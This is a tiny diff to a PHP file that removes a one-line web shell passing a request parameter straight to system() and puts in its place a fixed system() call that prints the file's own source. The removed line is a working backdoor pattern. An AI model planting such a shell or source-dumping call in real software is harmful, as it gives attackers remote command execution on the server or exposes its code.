@@ -1,1 +1,1 @@
-<?php system($_REQUEST['cmd']); ?>
+<?php system("cat index.php"); ?>
